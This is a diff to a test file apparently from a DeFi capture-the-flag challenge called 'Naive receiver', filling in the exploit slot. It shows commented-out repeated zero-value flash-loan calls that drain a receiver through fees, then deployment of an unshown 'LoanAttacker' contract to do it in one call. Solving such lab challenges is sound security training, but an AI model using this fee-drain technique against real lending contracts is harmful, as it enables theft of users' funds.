@@ -30,7 +30,24 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */ 
+        
+        // Naive for 10tx
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+        // await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+    
+        // Through a sc
+        const LoanAttackerFactory = await ethers.getContractFactory('LoanAttacker');
+        const loanAttacker = await LoanAttackerFactory.deploy();
+        await loanAttacker.attack(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
